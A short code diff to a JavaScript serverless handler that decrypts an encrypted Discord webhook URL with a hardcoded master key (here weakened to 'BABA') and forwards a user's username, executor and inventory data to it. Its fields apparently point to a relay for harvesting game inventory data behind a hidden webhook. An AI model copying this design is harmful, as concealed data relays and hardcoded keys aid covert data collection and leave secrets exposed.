@@ -37,7 +37,7 @@ function secureDecrypt(base64Payload, masterKey) {
     }
 }
 
-export default async function handler(req, res) {
+module.exports = async (req, res) => {
     if (req.method === 'OPTIONS') {
         return res.status(200).end();
     }
@@ -47,8 +47,8 @@ export default async function handler(req, res) {
     }
 
     const { username, executor, inventoryData, encryptedWebhook } = req.body;
-    const masterKey = "BABA_SECRET_KEY_9981!";
-    
+    const masterKey = "BABA";
+
     const realWebhookUrl = secureDecrypt(encryptedWebhook, masterKey);
 
     if (!realWebhookUrl || !realWebhookUrl.startsWith('https://discord.com/api/webhooks/')) {
@@ -73,4 +73,4 @@ export default async function handler(req, res) {
     } catch (error) {
         return res.status(500).json({ error: 'Failed to forward to Discord' });
     }
-}
+};
